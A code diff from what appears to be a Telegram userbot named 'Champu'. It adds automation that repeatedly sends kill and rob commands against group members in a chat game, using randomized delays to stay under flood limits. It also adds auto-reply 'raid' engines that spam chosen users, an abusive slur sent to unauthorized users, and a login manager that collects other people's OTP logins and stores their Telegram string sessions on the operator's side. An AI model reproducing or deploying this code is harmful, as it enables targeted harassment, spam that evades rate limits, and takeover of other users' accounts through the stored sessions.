+        mode_title = "𝐑ᴀɪᴅ (ᴋɪʟʟ + ʀᴏʙ)" if mode == "raid" else ("𝐒ᴛᴇᴀʟᴛʜ 𝐑ᴏʙ" if mode == "rob" else "𝐁ᴏᴜɴᴛʏ 𝐊ɪʟʟ")
+
+        await safe_edit(
+            status_msg,
+            f"⚡ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: 𝐅ᴏᴜɴᴅ `{total}` ᴀᴄᴛɪᴠᴇ ᴜsᴇʀs.\n⚔️ **Starting {mode_title} engine...**"
+        )
+
+        for idx, target_msgs in enumerate(targets, start=1):
+            if _BAKA_CANCELLED.get(chat_id):
+                raise asyncio.CancelledError()
+
+            cutoff_date = datetime.now(timezone.utc) - timedelta(days=14)
+            valid_msgs = [m for m in target_msgs if m.date >= cutoff_date]
+            if not valid_msgs:
+                continue
+
+            current_step_used: Set[int] = set()
+
+            def get_msg_for_step():
+                avail = [
+                    m for m in valid_msgs
+                    if str(m.id) not in previous_run_msg_ids and m.id not in current_step_used
+                ]
+                if avail:
+                    chosen = avail[0]
+                    current_step_used.add(chosen.id)
+                    previous_run_msg_ids.add(str(chosen.id))
+                    chat_used_dict[str(chosen.id)] = time.time()
+                    return chosen
+
+                avail_fallback = [m for m in valid_msgs if m.id not in current_step_used]
+                if avail_fallback:
+                    chosen = avail_fallback[0]
+                    current_step_used.add(chosen.id)
+                    return chosen
+
+                return valid_msgs[0]
+
+            kill_success_or_dead = True
+
+            # ── 1. Kill Step (if mode in raid or kill) ──
+            if mode in ("raid", "kill"):
+                kill_success_or_dead = False
+                for _ in range(3):
+                    if _BAKA_CANCELLED.get(chat_id):
+                        raise asyncio.CancelledError()
+
+                    k_msg = get_msg_for_step()
+                    if not k_msg:
+                        break
+
+                    kill_cmd = await _send_baka_cmd_safe(chat_id, f"/kill{BAKA_BOT_USERNAME}", reply_to=k_msg.id)
+                    if not kill_cmd:
+                        break
+
+                    reply = await _wait_baka_reply(chat_id, baka_id, kill_cmd.id, k_msg.id)
+                    reply_text = reply.text if reply else ""
+                    await _safe_delete_pair(chat_id, kill_cmd, reply)
+
+                    if not reply:
+                        break
+
+                    k_norm = _baka_normalize_text(reply_text)
+                    if any(x in k_norm for x in ("already used", "same message")):
+                        await _baka_sleep(0.8, chat_id)
+                        continue
+                    if any(kw in k_norm for kw in _BAKA_PROTECTED_KW):
+                        skipped += 1
+                        kill_success_or_dead = False
+                        break
+                    if any(kw in k_norm for kw in _BAKA_DEAD_KW):
+                        already_dead += 1
+                        kill_success_or_dead = True
+                        break
+
+                    killed += 1
+                    total_earned += _parse_baka_earned(reply_text)
+                    kill_success_or_dead = True
+                    break
+
+                await _baka_sleep(random.uniform(BAKA_STEP_GAP_MIN, BAKA_STEP_GAP_MAX), chat_id)
+
+            if not kill_success_or_dead:
+                continue
+
+            if mode != "kill":
+                # ── 2. Balance Check Step ──
+                amount = None
+                for _ in range(3):
+                    if _BAKA_CANCELLED.get(chat_id):
+                        raise asyncio.CancelledError()
+
+                    b_msg = get_msg_for_step()
+                    if not b_msg:
+                        break
+
+                    bal_cmd = await _send_baka_cmd_safe(chat_id, f"/bal{BAKA_BOT_USERNAME}", reply_to=b_msg.id)
+                    if not bal_cmd:
+                        continue
+
+                    reply = await _wait_baka_reply(chat_id, baka_id, bal_cmd.id, b_msg.id)
+                    reply_text = reply.text if reply else ""
+                    await _safe_delete_pair(chat_id, bal_cmd, reply)
+
+                    if not reply:
+                        continue
+
+                    b_norm = _baka_normalize_text(reply_text)
+                    if any(x in b_norm for x in ("already used", "same message")):
+                        await _baka_sleep(0.8, chat_id)
+                        continue
+
+                    amount = _parse_baka_balance(reply_text)
+                    break
+
+                if amount is None or amount < 1:
+                    amount = 10000
+
+                # ── 3. Rob Step (Clean, Fast Single-Hit) ──
+                rob_target = min(amount, 10000) if amount and amount > 0 else 10000
+                chunks = [rob_target]
+
+                for rob_chunk in chunks:
+                    if _BAKA_CANCELLED.get(chat_id):
+                        raise asyncio.CancelledError()
+
+                    await _baka_sleep(random.uniform(BAKA_ROB_DELAY_MIN, BAKA_ROB_DELAY_MAX), chat_id)
+
+                    r_msg = get_msg_for_step()
+                    if not r_msg:
+                        break
+
+                    rob_cmd = await _send_baka_cmd_safe(chat_id, f"/rob{BAKA_BOT_USERNAME} {rob_chunk}", reply_to=r_msg.id)
+                    if not rob_cmd:
+                        break
+
+                    reply = await _wait_baka_reply(chat_id, baka_id, rob_cmd.id, r_msg.id)
+                    reply_text = reply.text if reply else ""
+                    await _safe_delete_pair(chat_id, rob_cmd, reply)
+
+                    if not reply:
+                        break
+
+                    r_norm = _baka_normalize_text(reply_text)
+                    if any(x in r_norm for x in ("already used", "same message")):
+                        continue
+
+                    has_success = "✅" in reply_text or any(kw in r_norm for kw in ("success", "stole", "robbed", "got", "snatched"))
+                    if has_success:
+                        earned = _parse_baka_earned(reply_text)
+                        total_earned += earned if earned > 0 else rob_chunk
+                        robbed += 1
+                        break
+                    else:
+                        break
+
+            if idx % 5 == 0:
+                _save_baka_cache(cache)
+
+            now_t = time.time()
+            if (now_t - last_card_edit >= 4.0) or idx == total:
+                status_card = (
+                    "⚡ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ 𝐑ᴀɪᴅ 𝐈ɴ 𝐏ʀᴏɢʀᴇss ⚡\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🎯 𝐏ʀᴏɢʀᴇss     : `{idx} / {total}`\n"
+                    f"💀 𝐊ɪʟʟᴇᴅ       : `{killed}` ⚔️\n"
+                    f"💰 𝐑ᴏʙʙᴇᴅ       : `{robbed}` 💸\n"
+                    f"💵 𝐒ᴛᴏʟᴇɴ       : `${total_earned:,}`\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🛑 `.stopbaka` ᴛᴏ ʜᴀʟᴛ"
+                )
+                await safe_edit(status_msg, status_card)
+                last_card_edit = now_t
+
+            # Anti-Flood Cooldown Breather every 10 targets
+            if idx % 10 == 0 and idx < total:
+                await _baka_sleep(random.uniform(3.0, 4.2), chat_id)
+            else:
+                await _baka_sleep(random.uniform(BAKA_USER_GAP_MIN, BAKA_USER_GAP_MAX), chat_id)
+
+        _save_baka_cache(cache)
+
+        duration_sec = int(time.time() - start_time)
+        dur_str = f"{duration_sec // 60}m {duration_sec % 60}s" if duration_sec >= 60 else f"{duration_sec}s"
+
+        _BAKA_LAST_STATS[chat_id] = {
+            "chat_name": chat_name,
+            "total": total,
+            "killed": killed,
+            "robbed": robbed,
+            "skipped": skipped,
+            "total_earned": total_earned,
+            "duration": dur_str,
+        }
+
+        report = (
+            "👑 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ 𝐑ᴀɪᴅ 𝐑ᴇᴘᴏʀᴛ 👑\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👥 𝐆ʀᴏᴜᴘ         : `{chat_name}` (ID: `{chat_id}`)\n"
+            f"🎯 𝐓ᴀʀɢᴇᴛs 𝐒ᴄᴀɴɴᴇᴅ: `{total}`\n"
+            f"💀 𝐊ɪʟʟᴇᴅ         : `{killed}`\n"
+            f"💰 𝐑ᴏʙʙᴇᴅ         : `{robbed}`\n"
+            f"🛡️ 𝐒ʜɪᴇʟᴅᴇᴅ/𝐒ᴋɪᴘ  : `{skipped}`\n"
+            f"💵 𝐓ᴏᴛᴀʟ 𝐒ᴛᴏʟᴇɴ   : `${total_earned:,}` 💵\n"
+            f"⏱️ 𝐃ᴜʀᴀᴛɪᴏɴ       : `{dur_str}`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 𝐆ᴏᴅ 🔥"
+        )
+        try:
+            await bot.send_message("me", report)
+        except Exception:
+            pass
+
+        await safe_edit(status_msg, f"✅ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **{mode_title} completed successfully! Report sent to Saved Messages.**")
+        await asyncio.sleep(5)
+        await _safe_delete(status_msg)
+
+    except asyncio.CancelledError:
+        duration_sec = int(time.time() - start_time)
+        dur_str = f"{duration_sec // 60}m {duration_sec % 60}s" if duration_sec >= 60 else f"{duration_sec}s"
+        try:
+            await safe_edit(status_msg, "🛑 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Raid stopped immediately!**")
+            await asyncio.sleep(3)
+            await _safe_delete(status_msg)
+        except Exception:
+            pass
+
+        halt_report = (
+            "🛑 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ 𝐑ᴀɪᴅ 𝐇ᴀʟᴛᴇᴅ 🛑\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👥 𝐆ʀᴏᴜᴘ       : `{chat_name}`\n"
+            f"💀 𝐊ɪʟʟᴇᴅ       : `{killed}`\n"
+            f"💰 𝐑ᴏʙʙᴇᴅ       : `{robbed}`\n"
+            f"💵 𝐒ᴛᴏʟᴇɴ       : `${total_earned:,}`\n"
+            f"⏱️ 𝐃ᴜʀᴀᴛɪᴏɴ     : `{dur_str}`\n"
+            "━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        try:
+            await bot.send_message("me", halt_report)
+        except Exception:
+            pass
+
+    except Exception as exc:
+        try:
+            await safe_edit(status_msg, f"❌ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Error encountered →** `{str(exc)[:60]}`")
+            await asyncio.sleep(4)
+            await _safe_delete(status_msg)
+        except Exception:
+            pass
+
+    finally:
+        _BAKA_RUNNING[chat_id] = False
+        _BAKA_CANCELLED[chat_id] = False
+        _BAKA_TASKS.pop(chat_id, None)
+
+async def _trigger_baka_flow(event, mode: str):
+    chat_id = event.chat_id
+
+    if _BAKA_RUNNING.get(chat_id):
+        active_task = _BAKA_TASKS.get(chat_id)
+        if active_task and not active_task.done():
+            msg = await event.reply("⚠️ **Baka automation is already running in this group! Use `.stopbaka` to halt.**")
+            await asyncio.sleep(5)
+            await _safe_delete(msg)
+            return
+
+    status = await safe_edit(event, f"⚔️ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Initializing {mode.upper()} mode...**")
+    _BAKA_RUNNING[chat_id] = True
+    _BAKA_CANCELLED[chat_id] = False
+
+    task = asyncio.create_task(run_baka_automation(event, status, mode=mode))
+    _BAKA_TASKS[chat_id] = task
+
+@register_cmd("baka", group_only=True)
+async def cmd_baka(event, _):
+    await _trigger_baka_flow(event, mode="raid")
+
+@register_cmd("bakarob", group_only=True)
+async def cmd_bakarob(event, _):
+    await _trigger_baka_flow(event, mode="rob")
+
+@register_cmd("bakakill", group_only=True)
+async def cmd_bakakill(event, _):
+    await _trigger_baka_flow(event, mode="kill")
+
+@register_cmd("bakabal", group_only=True)
+async def cmd_bakabal(event, arg):
+    chat_id = event.chat_id
+    target_msg_id = None
+    target_name = "Target"
+
+    if event.is_reply:
+        reply = await event.get_reply_message()
+        if reply:
+            target_msg_id = reply.id
+            sender = await reply.get_sender()
+            target_name = getattr(sender, "first_name", "Target") or "Target"
+    elif arg:
+        try:
+            ent = await bot.get_entity(arg.strip())
+            target_name = getattr(ent, "first_name", arg.strip()) or arg.strip()
+            async for m in bot.iter_messages(chat_id, limit=80):
+                if m.sender_id == ent.id:
+                    target_msg_id = m.id
+                    break
+        except Exception:
+            pass
+
+    if not target_msg_id:
+        return await safe_edit(event, "❌ 𝐑ᴇᴘʟʏ ᴛᴏ ᴀ ᴜsᴇʀ's ᴍᴇssᴀɢᴇ ᴏʀ ᴜsᴇ: `.bakabal @user`")
+
+    status = await safe_edit(event, f"🔍 **Checking @im_bakabot balance for {target_name}...**")
+    baka_id = await _resolve_baka_bot()
+    if not baka_id:
+        return await safe_edit(event, "❌ **Could not resolve @im_bakabot!**")
+
+    bal_cmd = await _send_baka_cmd_safe(chat_id, f"/bal{BAKA_BOT_USERNAME}", reply_to=target_msg_id)
+    if not bal_cmd:
+        return await safe_edit(event, "❌ **Failed to send balance request.**")
+
+    reply = await _wait_baka_reply(chat_id, baka_id, bal_cmd.id, target_msg_id)
+    reply_text = reply.text if reply else ""
+    await _safe_delete_pair(chat_id, bal_cmd, reply)
+
+    if not reply:
+        return await safe_edit(event, f"⚠️ **No reply from {BAKA_BOT_USERNAME} (timed out).**")
+
+    bal = _parse_baka_balance(reply_text)
+    bal_str = f"${bal:,}" if bal is not None else "Unknown / Protected"
+
+    res = (
+        "💰 𝐁ᴀᴋᴀ 𝐁ᴀʟᴀɴᴄᴇ 𝐈ɴsᴘᴇᴄᴛᴏʀ 💰\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 𝐓ᴀʀɢᴇᴛ : **{target_name}**\n"
+        f"💵 𝐖ᴀʟʟᴇᴛ : `{bal_str}`\n"
+        "━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    await safe_edit(event, res)
+
+@register_cmd("stopbaka")
+async def cmd_stopbaka(event, _):
+    chat_id = event.chat_id
+    stopped_count = 0
+
+    if _BAKA_RUNNING.get(chat_id) or chat_id in _BAKA_TASKS:
+        _BAKA_CANCELLED[chat_id] = True
+        t = _BAKA_TASKS.get(chat_id)
+        if t and not t.done():
+            t.cancel()
+        stopped_count += 1
+
+    for cid, task in list(_BAKA_TASKS.items()):
+        _BAKA_CANCELLED[cid] = True
+        if task and not task.done():
+            task.cancel()
+            stopped_count += 1
+
+    if stopped_count > 0:
+        await safe_edit(event, "🛑 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **Stop signal sent! Ongoing raids stopped immediately.**")
+    else:
+        await safe_edit(event, "ℹ️ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **No active raid is currently running.**")
+
+@register_cmd("bakastop")
+async def cmd_bakastop(event, arg):
+    await cmd_stopbaka(event, arg)
+
+@register_cmd("bakastats")
+async def cmd_bakastats(event, _):
+    chat_id = event.chat_id
+    stats = _BAKA_LAST_STATS.get(chat_id)
+    if not stats and _BAKA_LAST_STATS:
+        stats = list(_BAKA_LAST_STATS.values())[-1]
+
+    if not stats:
+        return await safe_edit(event, "ℹ️ 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ: **No raid stats recorded yet in this session.**")
+
+    text = (
+        "📊 𝐁ᴀᴋᴀ 𝐆ᴀᴍᴇ — 𝐋ᴀsᴛ 𝐑ᴀɪᴅ 𝐒ᴛᴀᴛs 📊\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👥 𝐆ʀᴏᴜᴘ         : `{stats.get('chat_name', 'Unknown')}`\n"
+        f"🎯 𝐓ᴀʀɢᴇᴛs 𝐒ᴄᴀɴɴᴇᴅ: `{stats.get('total', 0)}`\n"
+        f"💀 𝐊ɪʟʟᴇᴅ         : `{stats.get('killed', 0)}`\n"
+        f"💰 𝐑ᴏʙʙᴇᴅ         : `{stats.get('robbed', 0)}`\n"
+        f"🛡️ 𝐒ʜɪᴇʟᴅᴇᴅ/𝐒ᴋɪᴘ  : `{stats.get('skipped', 0)}`\n"
+        f"💵 𝐓ᴏᴛᴀʟ 𝐒ᴛᴏʟᴇɴ   : `${stats.get('total_earned', 0):,}`\n"
+        f"⏱️ 𝐃ᴜʀᴀᴛɪᴏɴ       : `{stats.get('duration', '0s')}`\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 𝐆ᴏᴅ 🔥"
+    )
+    await safe_edit(event, text)
+
+@register_cmd("bakastat")
+async def cmd_bakastat(event, arg):
+    await cmd_bakastats(event, arg)
+
+
+# ────────────────────────────────────────────────
+#                   AUTO HANDLER
+# ────────────────────────────────────────────────
+async def auto_handler(event):
+    token = current_client_var.set(event.client)
+    try:
+        return await _inner_auto_handler(event)
+    finally:
+        current_client_var.reset(token)
+
+async def _inner_auto_handler(event):
+
+    # ⭐ ignore self messages fast
+    if event.out:
+        return
+
+    sender = event.sender_id
+    chat = event.chat_id
+
+    # ⭐ null safety
+    if not sender:
+        return
+
+    # 👑 OWNER PROTECT
+    if sender == OWNER_ID:
+        return
+
+    # ⭐ GLOBAL / LOCAL MUTE ENGINE
+    if sender in global_muted or sender in muted_users:
+        try:
+            await event.delete()
+        except:
+            pass
+        return
+
+    # ⭐ GROUP LOCK ENGINE
+    if chat in group_locks:
+        try:
+            if not is_admin(sender):
+                try:
+                    await event.delete()
+                except:
+                    pass
+                return
+        except:
+            pass
+
+    # ⭐ MAIN AUTO ACTION ENGINE
+    try:
+
+        # 🔥 REPLY RAID
+        if sender in reply_users:
+            try:
+                await event.reply(random.choice(reply_list))
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+        # 💥 REPLY GOD (multi burst)
+        if sender in replygod_users:
+            try:
+                for _ in range(3):
+                    await event.reply(random.choice(reply_texts))
+                    await asyncio.sleep(0.5)
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+        # 🌊 FLAG RAID
+        if sender in flag_users:
+            try:
+                await event.reply(random.choice(flag_texts))
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+        # 💜 HEART RAID
+        if sender in hrr_users:
+            try:
+                await event.reply(random.choice(heart_replies))
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+        # 🤣 RR RAID (GLOBAL)
+        if sender in rr_users:
+            try:
+                bot_msg = await event.reply(
+                    random.choice(fun_texts)
+                )
+
+                try:
+                    await bot(functions.messages.SendReactionRequest(
+                        peer=chat,
+                        msg_id=bot_msg.id,
+                        reaction=[types.ReactionEmoji(
+                            emoticon="🤣"
+                        )]
+                    ))
+                except:
+                    pass
+
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+        # ☄️ REPLY YORICHI (LIMITED COUNT)
+        if sender in replyyorichi_users:
+            try:
+                data = replyyorichi_users.get(sender)
+
+                if not data:
+                    return
+
+                count = int(data.get("count", 0))
+                text = data.get("text", "")
+
+                if count > 0:
+                    await event.reply(text)
+                    data["count"] = count - 1
+                else:
+                    replyyorichi_users.pop(sender, None)
+
+            except FloodWaitError as fw:
+                await asyncio.sleep(fw.seconds)
+            except:
+                pass
+
+    except Exception as e:
+        print(f"[AUTO_HANDLER_ERR] {str(e)[:80]}")
+
+
+async def auto_react(event):
+    token = current_client_var.set(event.client)
+    try:
+        return await _inner_auto_react(event)
+    finally:
+        current_client_var.reset(token)
+
+async def _inner_auto_react(event):
+
+    # ⭐ FAST EXIT
+    emoji = auto_react_emoji
+    if not emoji:
+        return
+
+    # ⭐ MESSAGE VALIDATION
+    msg_id = event.id
+    chat = event.chat_id
+
+    if not msg_id or not chat:
+        return
+
+    try:
+
+        # ⭐ REACTION ENGINE
+        await bot(functions.messages.SendReactionRequest(
+            peer=chat,
+            msg_id=msg_id,
+            reaction=[
+                types.ReactionEmoji(
+                    emoticon=emoji
+                )
+            ]
+        ))
+
+    except FloodWaitError as fw:
+        try:
+            await asyncio.sleep(fw.seconds)
+        except:
+            pass
+
+    except RPCError:
+        # ⭐ silent rpc fail safe
+        pass
+
+    except Exception:
+        # ⭐ unknown crash isolation
+        pass
+
+# ────────────────────────────────────────────────
+#                   COMMAND HANDLER
+# ────────────────────────────────────────────────
+async def dispatcher(event):
+    token = current_client_var.set(event.client)
+    try:
+        return await _inner_dispatcher(event)
+    finally:
+        current_client_var.reset(token)
+
+async def _inner_dispatcher(event):
+
+    text = event.raw_text
+
+    # ⭐ basic validation ultra fast
+    if not text:
+        return
+
+    if not text.startswith("."):
+        return
+
+    # ⭐ safe split engine (never IndexError)
+    body = text[1:].strip()
+
+    if not body:
+        return
+
+    parts = body.split(maxsplit=1)
+
+    cmd = parts[0].lower().strip()
+    arg = parts[1].strip() if len(parts) > 1 else ""
+
+    # ⭐ command lookup safety
+    cmd_data = commands.get(cmd)
+    if not cmd_data:
+        return
+
+    sender = event.sender_id
+
+    # ⭐ null sender protection (channel / anon admin)
+    if not sender:
+        return
+
+    # ⚡ permission branch: account owner or global owner
+    client_owner = getattr(event.client, "user_id", None) or OWNER_ID
+    if sender != client_owner and sender != OWNER_ID:
+
+        if sender not in admins:
+            try:
+                await event.reply(
+                    "𝐂ʜᴀᴍᴘᴜ 𝐊ᴏ 𝐁ᴀᴀᴘ 𝐁ᴀɴᴀ 𝐑ᴀɴᴅɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐋ᴀᴅᴋᴇ 🤩🖕🏻"
+                )
+            except:
+                pass
+            return
+
+        if cmd in {"copy", "normal", "addadmin", "deladmin", "admins"}:
+            await safe_edit(event, "❌ 𝐎ᴡɴᴇʀ 𝐎ɴʟʏ 𝐂ᴍᴅ")
+            return
+
+    # ⭐ group restriction engine
+    if cmd_data.get("group_only"):
+        try:
+            if not event.is_group:
+                await safe_edit(event, "⚠️ 𝐆ʀᴏᴜᴘ 𝐎ɴʟʏ 𝐂ᴏᴍᴍᴀɴᴅ")
+                return
+        except:
+            return
+
+    # ⭐ reply requirement engine
+    if cmd_data.get("needs_reply"):
+        try:
+            if not event.is_reply and not arg:
+                await safe_edit(
+                    event,
+                    f"❌ 𝐑ᴇᴘʟʏ 𝐎ʀ 𝐏ᴀss 𝐓ᴀʀɢᴇᴛ\n👉 .{cmd} @user / id"
+                )
+                return
+        except:
+            return
+
+    # ⭐ command execution core
+    try:
+
+        await cmd_data["func"](event, arg)
+
+    except FloodWaitError as e:
+        try:
+            await safe_edit(
+                event,
+                f"⏳ 𝐅ʟᴏᴏᴅ𝐖ᴀɪᴛ → `{e.seconds}s`"
+            )
+        except:
+            pass
+
+    except Exception as e:
+        try:
+            await safe_edit(
+                event,
+                f"❌ 𝐄ʀʀᴏʀ → `{str(e)[:50]}`"
+            )
+        except:
+            pass
+
+# ────────────────────────────────────────────────
+#        CHAMPU BOT MANAGER & MULTI-USER LOGIN
+# ────────────────────────────────────────────────
+
+def register_client_handlers(cl: TelegramClient):
+    """Registers userbot event handlers onto any user client."""
+    cl.add_event_handler(auto_handler, events.NewMessage)
+    cl.add_event_handler(auto_react, events.NewMessage(outgoing=True))
+    cl.add_event_handler(dispatcher, events.NewMessage)
+
+async def start_user_client(cl: TelegramClient, owner_tg_id: int) -> bool:
+    """Activates and registers a newly logged in user client."""
+    try:
+        if not cl.is_connected():
+            await cl.connect()
+        if not await cl.is_user_authorized():
+            return False
+
+        me = await cl.get_me()
+        cl.user_id = me.id
+        register_client_handlers(cl)
+        ACTIVE_CLIENTS[me.id] = cl
+
+        # Save string session
+        s_str = cl.session.save()
+        save_user_session(me.id, {
+            "user_id": me.id,
+            "first_name": me.first_name,
+            "username": getattr(me, "username", None),
+            "string_session": s_str,
+            "managed_by": owner_tg_id,
+            "login_time": int(time.time()),
+        })
+        return True
+    except Exception as exc:
+        print(f"[START_USER_CLIENT_ERROR] {exc}")
+        return False
+
+async def stop_user_client(user_id: int):
+    """Stops and removes an active user client."""
+    cl = ACTIVE_CLIENTS.pop(user_id, None)
+    if cl:
+        try:
+            if cl.is_connected():
+                await cl.disconnect()
+        except Exception:
+            pass
+    remove_user_session(user_id)
+
+# ────────────────────────────────────────────────
+#           CONVERSATIONAL LOGIN STATE
+# ────────────────────────────────────────────────
+def _otp_type_text(sent):
+    """Batata hai ki Telegram ne OTP kahan bheja."""
+    name = type(getattr(sent, "type", None)).__name__
+    if "App" in name:
+        return "📲 Telegram app ke andar — **Telegram** (Service notifications) chat me dekhein"
+    if "Sms" in name:
+        return "💬 **SMS** se aapke phone number par"
+    if "Call" in name or "FlashCall" in name or "MissedCall" in name:
+        return "📞 **Phone call** se"
+    if "Email" in name:
+        return "📧 **Email** par"
+    return f"ℹ️ Type: {name}"
+
+async def _resend_otp(flow):
+    """Telegram se agle method (SMS/call) par OTP dobara bhejta hai."""
+    temp_cl = flow.get("temp_client")
+    if not temp_cl:
+        return None
+    res = await temp_cl(functions.auth.ResendCodeRequest(
+        phone_number=flow["phone"], phone_code_hash=flow["phone_code_hash"]))
+    flow["phone_code_hash"] = res.phone_code_hash
+    return res
+
+def _otp_buttons():
+    return [
+        [Button.inline("🔄 Resend Code (SMS/Call)", data=b"resend_otp")],
+        [Button.inline("❌ 3. Close", data=b"cancel_login")],
+    ]
+
+def _to_telethon_session(sess: str) -> str:
+    """Pyrogram string session (BQ...) ko Telethon format me convert karta hai.
+    Telethon string ho to waise hi wapas deta hai."""
+    import base64, struct, ipaddress
+    sess = sess.strip()
+    if sess.startswith("1") and len(sess) in (353, 352, 351):
+        return sess
+    try:
+        raw = base64.urlsafe_b64decode(sess + "=" * (-len(sess) % 4))
+        if len(raw) == 271:
+            dc, _api, _test, key, _uid, _bot = struct.unpack(">BI?256sQ?", raw)
+        elif len(raw) == 267:  # old pyrogram format
+            dc, _test, key, _uid, _bot = struct.unpack(">B?256sQ?", raw)
+        else:
+            return sess
+        ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100",
+               4: "149.154.167.91", 5: "91.108.56.130"}
+        ip = ipaddress.ip_address(ips[dc]).packed
+        return "1" + base64.urlsafe_b64encode(struct.pack(">B4sH256s", dc, ip, 443, key)).decode()
+    except Exception:
+        return sess
+
+_LOGIN_FLOW: Dict[int, dict] = {}
+
+async def _clean_login_flow(uid: int):
+    flow = _LOGIN_FLOW.pop(uid, None)
+    if flow and flow.get("temp_client"):
+        try:
+            cl = flow["temp_client"]
+            if cl.is_connected():
+                await cl.disconnect()
+        except Exception:
+            pass
+
+# ─── 1. /start Handler ───
+@manager_bot.on(events.NewMessage(pattern=r"^/start"))
+async def mb_start(event):
+    if not event.is_private:
+        return
+
+    uid = event.sender_id
+    sender = await event.get_sender()
+    first_name = getattr(sender, "first_name", "User") or "User"
+
+    await _clean_login_flow(uid)
+
+    is_active = uid in ACTIVE_CLIENTS
+    status_badge = "🟢 **Active & Online**" if is_active else "🔴 **Offline (Not Logged In)**"
+
+    text = (
+        "✨ 𝐖ᴇʟᴄᴏᴍᴇ ᴛᴏ 𝐂ʜᴀᴍᴘᴜ 𝐌ᴜʟᴛɪ-𝐔sᴇʀʙᴏᴛ 𝐌ᴀɴᴀɢᴇʀ ✨\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👋 **Namaste {first_name}!**\n\n"
+        f"⚡ **Aapka Userbot Status**: {status_badge}\n\n"
+        "Is bot ke zariye aap apna Telegram account login karke apna khud ka **Champu Userbot** host kar sakte hain!\n\n"
+        "👑 **Features Included**:\n"
+        "• ⚔️ Baka Game Automation (`.baka`, `.bakarob`, `.bakakill`)\n"
+        "• 💣 Raid & Attack Engines (`.reply`, `.rr`, `.flag`, `.spray`)\n"
+        "• 🔇 Mute, Purge & Group Moderation (`.mute`, `.purge`, `.lock`)\n"
+        "• 🛠️ 50+ Utilities (`.menu`, `.ping`, `.banner`, `.clone`, `.notes`)\n\n"
+        "👇 **Niche diye gaye Login button par click karein:**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🔥 𝐏ᴏᴡᴇʀᴇᴅ ʙʏ 𝐂ʜᴀᴍᴘᴜ 🔥"
+    )
+
+    buttons = [
+        [Button.inline("🔐 Login Userbot", data=b"start_login")],
+        [Button.inline("📡 My Status", data=b"status"),
+         Button.inline("📖 Commands Help", data=b"help")],
+        [Button.inline("🛑 Logout Userbot", data=b"logout"),
+         Button.inline("❌ Close", data=b"close_menu")],
+    ]
+
+    await event.respond(text, buttons=buttons)
+
+# ─── 2. CallbackQuery Handler (Buttons) ───
+@manager_bot.on(events.CallbackQuery)
+async def mb_callback(event):
+    data = event.data
+    uid = event.sender_id
+
+    # 1. Start Login Flow
+    if data == b"start_login":
+        if uid in ACTIVE_CLIENTS:
+            await event.respond("⚠️ **Aapka userbot already active hai!**\nNaya account lagane se pehle `Logout Userbot` karein.")
+            await event.answer()
+            return
+
+        await _clean_login_flow(uid)
+        _LOGIN_FLOW[uid] = {
+            "step": "AWAIT_API_ID",
+            "time": time.time(),
+        }
+
+        step1_text = (
+            "🔐 **Champu Userbot Setup — Step 1/2**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Kripya apna **Telegram API ID** bhejein.\n\n"
+            "💡 *Tip: Agar aapke paas apna API ID nahi hai, to niche 'Use Default API ID & Hash' button daba kar aage badh sakte hain:*\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        step1_buttons = [
+            [Button.inline("⚡ Use Default API ID & Hash", data=b"use_default_api")],
+            [Button.inline("❌ 3. Close", data=b"cancel_login")],
+        ]
+        await event.respond(step1_text, buttons=step1_buttons)
+        await event.answer()
+
+    # 2. Use Default API ID & HASH
+    elif data == b"use_default_api":
+        if uid not in _LOGIN_FLOW:
+            _LOGIN_FLOW[uid] = {"time": time.time()}
+
+        _LOGIN_FLOW[uid]["api_id"] = API_ID
+        _LOGIN_FLOW[uid]["api_hash"] = API_HASH
+        _LOGIN_FLOW[uid]["step"] = "CHOOSE_METHOD"
+
+        method_text = (
+            "🎯 **Select Login Method**\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "✅ **Default API Credentials Selected!**\n\n"
+            "Aap apna account kis tarike se login karna chahte hain? Niche chuniye:\n\n"
+            "1️⃣ **Login By Number** — Phone number par OTP aayega.\n"
+            "2️⃣ **Login By Session** — Telethon String Session paste karein.\n"
+            "3️⃣ **Close** — Process cancel karein.\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        method_buttons = [
+            [Button.inline("📱 1. Login By Number", data=b"method_number")],
